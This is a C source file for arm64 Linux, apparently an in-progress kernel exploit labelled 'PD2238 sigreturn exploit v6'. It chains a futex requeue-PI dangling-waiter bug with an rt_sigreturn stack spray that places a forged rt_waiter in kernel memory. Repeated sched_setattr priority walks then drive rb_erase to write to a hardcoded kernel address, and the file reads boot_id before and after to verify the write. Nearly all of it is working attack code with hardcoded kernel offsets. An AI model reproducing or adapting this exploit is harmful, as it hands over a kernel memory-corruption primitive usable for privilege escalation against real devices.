/* PD2238 sigreturn exploit v6 - clean rebuild
 * Route: REQUEUE(dangling pib) -> rt_sigreturn(FPSIMD overlay at depth 0x300)
 *        -> consumer walks -> rb_erase writes sysctl_bootid
 */
static long sys(long n,long a,long b,long c,long d,long e,long f){
  register long x8 __asm__("x8")=n; register long x0 __asm__("x0")=a;
  register long x1 __asm__("x1")=b; register long x2 __asm__("x2")=c;
  register long x3 __asm__("x3")=d; register long x4 __asm__("x4")=e;
  register long x5 __asm__("x5")=f;
  __asm__ volatile("svc #0":"+r"(x0):"r"(x8),"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5):"memory");
  return x0;
}
#define SYS_write 64
#define SYS_read 63
#define SYS_openat 56
#define SYS_close 57
#define SYS_nanosleep 101
#define SYS_futex 98
#define SYS_clock_gettime 113
#define SYS_gettid 178
#define SYS_rt_sigreturn 139
#define SYS_sched_setattr 274
#define SYS_mkdirat 34
#define SYS_mount 40
#define SYS_fcntl 25
#define SYS_dup3 24
#define SYS_timerfd_create 85
#define FUTEX_LOCK_PI 6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define CLOCK_MONOTONIC 1
#define AT_FDCWD -100
#define SCHED_OTHER 0
#define SCHED_BATCH 3
#define CLONE_FLAGS 0x50f00

#define KBASE         0xffffffc008000000UL
#define BOOTID_TARGET (KBASE + 0x02ee910dUL)
#define INIT_TASK     (KBASE + 0x02aec240UL)
#define SCRATCH       (KBASE + 0x02e90000UL)

static void puts_(const char*s){long n=0;while(s[n])n++;sys(SYS_write,1,(long)s,n,0,0,0);}
static void putx_(unsigned long v){
  char b[18]; b[0]='0'; b[1]='x';
  for(int i=0;i<16;i++){ int nib=(v>>((15-i)*4))&0xf; b[2+i]= nib<10?('0'+nib):('a'+nib-10); }
  sys(SYS_write,1,(long)b,18,0,0,0);
}
static void nsleep_us(long us){long ts[2]={us/1000000,(us%1000000)*1000};sys(SYS_nanosleep,(long)ts,0,0,0,0,0);}
static void show_bootid(const char*tag){
  char buf[64]; for(int i=0;i<64;i++) buf[i]=0;
  long fd=sys(SYS_openat,AT_FDCWD,(long)"/proc/sys/kernel/random/boot_id",0,0,0,0);
  puts_(tag);
  if(fd<0){ puts_("<err>\n"); return; }
  long n=sys(SYS_read,fd,(long)buf,60,0,0,0);
  sys(SYS_close,fd,0,0,0,0,0);
  if(n>0) sys(SYS_write,1,(long)buf,n,0,0,0);
  puts_("\n");
}
__attribute__((naked)) static long thr_clone(long flags,void*stack,int(*fn)(void*),void*arg){
  __asm__ volatile(
    "mov x9, x2\n" "mov x10, x3\n"
    "mov x2, #0\n" "mov x3, #0\n" "mov x4, #0\n"
    "mov x8, #220\n" "svc #0\n"
    "cbnz x0, 1f\n"
    "mov x0, x10\n" "blr x9\n"
    "mov x8, #93\n" "svc #0\n"
    "1:\n" "ret\n");
}

volatile unsigned int f_wait, f_pi_target, f_pi_chain;
volatile int waiter_ready, owner_started, waiter_waiting, go_walk;
volatile long waiter_tid;
static char wstack[65536] __attribute__((aligned(16)));
static char ostack[65536] __attribute__((aligned(16)));
static char cstack[65536] __attribute__((aligned(16)));

struct sched_attr{unsigned int size;unsigned int policy;unsigned long long flags;
  int nice;unsigned int priority;unsigned long long runtime,deadline,period;};

/* ===== sigframe: pure byte offsets, no structs ===== */
static unsigned char sfbuf[0x1500] __attribute__((aligned(16)));

static void build_sigframe(void){
  for(unsigned i=0;i<sizeof(sfbuf);i++) sfbuf[i]=0;

  /* uc_mcontext.__reserved @ sigframe offset 0x2C0 */
  unsigned char *res = sfbuf + 0x2C0;

  /* fpsimd_context header */
  /* magic = 0x46508001 */
  res[0]=0x01; res[1]=0x80; res[2]=0x50; res[3]=0x46;
  /* size = 0x210 */
  res[4]=0x10; res[5]=0x02; res[6]=0; res[7]=0;
  /* fpsr=0 fpcr=0 */
  res[8]=0; res[9]=0; res[10]=0; res[11]=0;
  res[12]=0; res[13]=0; res[14]=0; res[15]=0;

  /* vregs starts at reserved+0x10 (= sfbuf+0x2D0) */
  /* fake rt_waiter (5.10 flat, 80B):
   * +0x00 tree.pc = parent(SCRATCH+0x108) = write value
   * +0x08 tree.right = 0
   * +0x10 tree.left = &sysctl_bootid = write target
   * +0x18 pi_tree.pc = parent
   * +0x20 pi_tree.right = 0
   * +0x28 pi_tree.left = &sysctl_bootid
   * +0x30 task = INIT_TASK
   * +0x38 lock = SCRATCH
   * +0x40 prio = 3
   */
  unsigned char *w = res + 0x10;
  unsigned long parent = SCRATCH + 0x108;
  unsigned long lockval = SCRATCH;
  unsigned long bootid_va = BOOTID_TARGET;
  unsigned long init_task_va = INIT_TASK;
  unsigned long prio_val = 3;

  /* w0: tree.pc = parent */
  for(int i=0;i<8;i++) w[i] = ((unsigned char*)&parent)[i];
  /* w1: right = 0 */
  for(int i=0;i<8;i++) w[8+i] = 0;
  /* w2: left = &bootid */
  for(int i=0;i<8;i++) w[16+i] = ((unsigned char*)&bootid_va)[i];
  /* w3: pi.pc = parent */
  for(int i=0;i<8;i++) w[24+i] = ((unsigned char*)&parent)[i];
  /* w4: pi.right = 0 */
  for(int i=0;i<8;i++) w[32+i] = 0;
  /* w5: pi.left = &bootid */
  for(int i=0;i<8;i++) w[40+i] = ((unsigned char*)&bootid_va)[i];
  /* w6: task = INIT_TASK */
  for(int i=0;i<8;i++) w[48+i] = ((unsigned char*)&init_task_va)[i];
  /* w7: lock = SCRATCH */
  for(int i=0;i<8;i++) w[56+i] = ((unsigned char*)&lockval)[i];
  /* w8: prio = 3 */
  for(int i=0;i<8;i++) w[64+i] = ((unsigned char*)&prio_val)[i];

  /* terminator after fpsimd (reserved+0x220): all zeros ✓ */

  /* set pc -> infinite loop address */
  /* after_sigreturn_loop is a function we define below */
  extern void after_sigreturn_loop(void);
  unsigned long pc_target = (unsigned long)&after_sigreturn_loop;
  /* pc is at mcontext offset 0x108, mcontext at sigframe+0x128+0xA0... 
   * actually simpler: hardcode from known layout */
  /* mc starts at sigframe offset 0x128+0xA0-0x80 = ... let me just use 0x230 */
  /* From PLAN-B: __reserved at SP0+0x2C0, so mcontext fields before that */
  /* pstate at 0x2B8, pc at 0x2B0, sp at 0x2A8 */
  for(int i=0;i<8;i++) sfbuf[0x2B0+i] = ((unsigned char*)&pc_target)[i];
}

/* sigreturn jumps here: pure CPU spin (no syscall to preserve kernel stack) */
void after_sigreturn_loop(void){
  puts_("SIGRETURN_OK\n");
  /* 浅层 nanosleep 让出 CPU 但不会覆盖深度0x300的内核栈 */
  for(;;){ long ts[2]={0,500000000}; sys(SYS_nanosleep,(long)ts,0,0,0,0,0); }
}

static int waiter_fn(void*a){
  (void)a;
  waiter_tid = sys(SYS_gettid,0,0,0,0,0,0);
  puts_("WTID="); putx_((unsigned long)waiter_tid); puts_("\n");
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  waiter_ready=1;
  while(!owner_started) nsleep_us(1000);
  long to[2]; sys(SYS_clock_gettime,CLOCK_MONOTONIC,(long)to,0,0,0,0);
  to[0]+=3;
  waiter_waiting=1;
  sys(SYS_futex,(long)&f_wait,FUTEX_WAIT_REQUEUE_PI,0,(long)to,(long)&f_pi_target,0);
  puts_("W_RET(pib_dangling)\n");
  nsleep_us(300000);

  build_sigframe();
  puts_("CALL_SIGRETURN\n");

  __asm__ volatile(
    "mov sp, %0\n"
    "mov x8, #139\n"
    "svc #0\n"
    : : "r" (sfbuf) : "x8", "sp"
  );
  puts_("SIGRET_BADFRAME\n");
  for(;;) nsleep_us(500000);
}
static int owner_fn(void*a){
  (void)a;
  sys(SYS_futex,(long)&f_pi_target,FUTEX_LOCK_PI,0,0,0,0);
  while(!waiter_ready) nsleep_us(1000);
  owner_started=1;
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  for(;;) nsleep_us(500000);
}

static int consumer_fn(void*a){
  (void)a;
  while(!go_walk) nsleep_us(10000);
  puts_("CONSUMER_ON\n");
  long i=0;
  for(;;){
    struct sched_attr at; char*p=(char*)&at; for(unsigned k=0;k<sizeof(at);k++)p[k]=0;
    at.size=sizeof(at);
    at.policy=(i&1)?SCHED_BATCH:SCHED_OTHER;
    at.nice=(int)(i%19)+1;
    sys(SYS_sched_setattr,waiter_tid,(long)&at,0,0,0,0);
    i++;
    if(i==50){ puts_("WALKS50\n"); }
    nsleep_us(5000);
  }
}

void _start(void){
  puts_("\n=== V6-SIGRET ===\n");
  show_bootid("BOOTID_BEFORE=");
  thr_clone(CLONE_FLAGS,ostack+sizeof(ostack),owner_fn,0);
  thr_clone(CLONE_FLAGS,wstack+sizeof(wstack),waiter_fn,0);
  thr_clone(CLONE_FLAGS,cstack+sizeof(cstack),consumer_fn,0);
  while(!waiter_waiting || !owner_started) nsleep_us(1000);
  nsleep_us(100000);
  sys(SYS_futex,(long)&f_wait,FUTEX_CMP_REQUEUE_PI,1,1,(long)&f_pi_target,0);
  puts_("REQUEUE_DONE\n");
  /* 等 waiter 完成 sigreturn 并进入死循环 */
  nsleep_us(10000000);  /* 10 秒 */
  /* 开始 walk */
  go_walk=1;
  puts_("GO_WALK\n");
  nsleep_us(30000000);  /* 30 秒打点窗口 */
  show_bootid("BOOTID_AFTER=");
  puts_("=== V6-DONE ===\n");
  for(;;) nsleep_us(500000);
}
